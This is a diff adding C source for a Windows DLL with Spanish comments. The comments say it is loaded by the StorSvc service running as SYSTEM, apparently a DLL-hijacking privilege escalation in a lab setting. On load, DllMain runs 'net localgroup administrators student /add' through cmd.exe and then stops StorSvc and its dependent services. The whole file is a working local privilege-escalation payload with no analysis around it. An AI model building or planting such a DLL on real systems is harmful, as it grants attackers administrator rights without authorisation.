@@ -1,0 +1,171 @@
+#include <windows.h>
+#pragma warning(disable:4996)
+
+#define DllExport   __declspec( dllexport )
+#define UNLEN 256
+
+// Prototipo de la función para detener servicios dependientes
+BOOL StopDependentServices();
+
+void DoStuff() {
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi;
+
+    // COMANDO CLAVE: Agrega al usuario 'student' al grupo de administradores locales
+    // Se ejecuta como SYSTEM cuando el servicio StorSvc carga la DLL
+    if (CreateProcess(L"C:\\Windows\\System32\\cmd.exe", L" /C net localgroup administrators student /add",
+        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi)) 
+    {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    return;
+}
+
+// Función para detener el servicio StorSvc y gatillar la recarga de la DLL
+VOID __stdcall DoStopSvc()
+{
+    SERVICE_STATUS_PROCESS ssp;
+    DWORD dwStartTime = GetTickCount64();
+    DWORD dwBytesNeeded;
+    DWORD dwTimeout = 30000; 
+    DWORD dwWaitTime;
+    SC_HANDLE schSCManager, schService;
+    LPCTSTR szSvcName = L"StorSvc";
+
+    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); 
+
+    if (NULL == schSCManager) return;
+
+    schService = OpenService(schSCManager, szSvcName, 
+        SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS);
+
+    if (schService == NULL) {
+        CloseServiceHandle(schSCManager);
+        return;
+    }
+
+    if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
+        goto stop_cleanup;
+
+    if (ssp.dwCurrentState == SERVICE_STOPPED)
+        goto stop_cleanup;
+
+    while (ssp.dwCurrentState == SERVICE_STOP_PENDING) {
+        dwWaitTime = ssp.dwWaitHint / 10;
+        if (dwWaitTime < 1000) dwWaitTime = 1000;
+        else if (dwWaitTime > 10000) dwWaitTime = 10000;
+
+        Sleep(dwWaitTime);
+
+        if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
+            goto stop_cleanup;
+
+        if (ssp.dwCurrentState == SERVICE_STOPPED)
+            goto stop_cleanup;
+
+        if (GetTickCount64() - dwStartTime > dwTimeout)
+            goto stop_cleanup;
+    }
+
+    StopDependentServices();
+
+    if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
+        goto stop_cleanup;
+
+    while (ssp.dwCurrentState != SERVICE_STOPPED) {
+        Sleep(ssp.dwWaitHint);
+        if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
+            goto stop_cleanup;
+
+        if (ssp.dwCurrentState == SERVICE_STOPPED) break;
+
+        if (GetTickCount64() - dwStartTime > dwTimeout)
+            goto stop_cleanup;
+    }
+
+stop_cleanup:
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+}
+
+BOOL StopDependentServices()
+{
+    DWORD i, dwBytesNeeded, dwCount;
+    LPENUM_SERVICE_STATUS lpDependencies = NULL;
+    ENUM_SERVICE_STATUS ess;
+    SC_HANDLE hDepService, schSCManager, schService;
+    SERVICE_STATUS_PROCESS ssp;
+    LPCTSTR szSvcName = L"StorSvc";
+    DWORD dwStartTime = GetTickCount64();
+    DWORD dwTimeout = 30000;
+
+    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (NULL == schSCManager) return FALSE;
+
+    schService = OpenService(schSCManager, szSvcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS);
+    if (schService == NULL) {
+        CloseServiceHandle(schSCManager);
+        return FALSE;
+    }
+
+    if (EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, 0, &dwBytesNeeded, &dwCount)) {
+        CloseServiceHandle(schService);
+        CloseServiceHandle(schSCManager);
+        return TRUE;
+    }
+
+    if (GetLastError() != ERROR_MORE_DATA) return FALSE;
+
+    lpDependencies = (LPENUM_SERVICE_STATUS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);
+    if (!lpDependencies) return FALSE;
+
+    if (!EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, dwBytesNeeded, &dwBytesNeeded, &dwCount))
+        return FALSE;
+
+    for (i = 0; i < dwCount; i++) {
+        ess = *(lpDependencies + i);
+        hDepService = OpenService(schSCManager, ess.lpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
+        if (!hDepService) return FALSE;
+
+        if (ControlService(hDepService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp)) {
+            while (ssp.dwCurrentState != SERVICE_STOPPED) {
+                Sleep(ssp.dwWaitHint);
+                QueryServiceStatusEx(hDepService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded);
+                if (ssp.dwCurrentState == SERVICE_STOPPED) break;
+                if (GetTickCount64() - dwStartTime > dwTimeout) break;
+            }
+        }
+        CloseServiceHandle(hDepService);
+    }
+
+    HeapFree(GetProcessHeap(), 0, lpDependencies);
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+    return TRUE;
+}
+
+// Exportación requerida por WIN10RpcClient.exe
+int DllExport FactoryResetUICC()
+{
+    DoStuff();
+    DoStopSvc();
+    return 0;
+}
+
+// Punto de entrada de la DLL
+DllExport BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        FactoryResetUICC();
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
